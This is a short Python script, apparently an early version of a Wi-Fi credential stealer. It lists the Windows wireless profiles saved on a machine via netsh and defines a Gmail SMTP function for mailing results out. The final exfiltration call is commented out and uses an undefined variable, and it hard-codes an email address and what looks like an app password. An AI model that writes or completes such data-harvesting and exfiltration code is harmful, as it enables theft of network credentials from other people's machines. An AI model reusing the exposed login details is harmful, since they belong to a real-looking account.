import subprocess, smtplib
import re

def send_mail(email, password, message):
    # Initiate smtp server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    # Login
    server.login(email,password)
    # Send message to own email from own email with message
    server.sendmail(email, email, message)
    server.quit()

command = 'netsh wlan show profile'
networks = str(subprocess.check_output(command, shell=True))
networks = networks.split('\\r\\n')
print(networks)
network_names = re.findall(r'(?:All User Profile\s*:\s)(.*)', str(networks))
print(network_names)
# send_mail('seidoster@gmail.com', 'wyslljxallhfsmjp', result)
